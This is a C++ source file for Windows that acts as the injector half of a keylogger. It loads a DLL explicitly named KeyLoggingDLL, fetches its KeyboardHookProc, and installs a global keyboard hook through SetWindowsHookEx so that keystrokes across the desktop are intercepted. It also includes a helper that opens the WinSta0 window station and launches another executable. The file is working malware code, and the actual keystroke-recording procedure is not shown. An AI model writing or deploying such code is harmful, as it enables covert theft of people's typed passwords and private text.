#include <stdio.h>
#include <iostream>

#include <windows.h>
#include <tlhelp32.h>
#include <psapi.h>
#include <string.h>

#define no_init_all deprecated



bool CreateProcessInWindowStation()
{
	// Step 1: Obtain a handle to the target window station
	HWINSTA hWinSta = OpenWindowStation(L"WinSta0", FALSE, READ_CONTROL | WRITE_DAC);
	if (hWinSta == nullptr)
	{
		std::cout << "Failed to open window station. Error: " << GetLastError() << std::endl;
		return false;
	}

	// Step 2: Switch to the desired window station
	if (!SetProcessWindowStation(hWinSta))
	{
		std::cout << "Failed to set window station. Error: " << GetLastError() << std::endl;
		CloseWindowStation(hWinSta);
		return false;
	}

	// Step 3: Create the process
	STARTUPINFO si = {};
	si.cb = sizeof(STARTUPINFO);
	PROCESS_INFORMATION pi = {};

	if (!CreateProcess(
		L"C:\\Users\\ISE\\source\\repos\\WinSta0\\x64\\Debug\\WinSta0.exe",                // Module name (use command line)
		NULL,  // Command line
		NULL,                // Process attributes
		NULL,                // Thread attributes
		FALSE,                  // Inherit handles
		0,                      // Creation flags
		NULL,                // Environment variables
		NULL,                // Current directory
		&si,                    // Startup info
		&pi                     // Process info
	))
	{
		std::cout << "Failed to create process. Error: " << GetLastError() << std::endl;
		CloseWindowStation(hWinSta);
		return false;
	}

	// Step 4: Restore the original window station
	SetProcessWindowStation(GetProcessWindowStation());

	// Cleanup
	CloseWindowStation(hWinSta);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	return true;
}
 
void _printf(const char* format, ...)
{
	char msg[100];
	wchar_t	wmsg[101];
	va_list args;
	va_start(args, format);
	vsnprintf(msg, sizeof(msg), format, args); // do check return value
	va_end(args);
	size_t outsize;
	size_t size = strlen(msg) + 1;
	mbstowcs_s(&outsize, wmsg, size, msg, size - 1);
	OutputDebugString(wmsg);

}
int main()
{
	HMODULE dll;
	HHOOK hook;
	HOOKPROC hookproc;
	const wchar_t* dll_path = L"C:\\Users\\ISE\\source\\repos\\KeyLoggingDLL\\x64\\Debug\\KeyLoggingDLL.dll";
	_printf("In injector\n");
	dll = LoadLibraryEx(dll_path, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (dll)
	{
		hookproc = (HOOKPROC)GetProcAddress(dll, "KeyboardHookProc");
		
		if (hookproc)
		{
			hook = SetWindowsHookEx(WH_KEYBOARD, hookproc, dll, 0);
			if (hook)
			{
				while (1)
				{
					Sleep(1000);
				}
				_printf("Out");
				UnhookWindowsHookEx(hook);
			}
			else
			{
				_printf("Set Windows Hook failed\n");
			}
		}
		else
		{
			_printf("Get Proc address failed\n");
		}
	}
	else
	{
		_printf("Load dll failed\n");
	}
	return 0;
}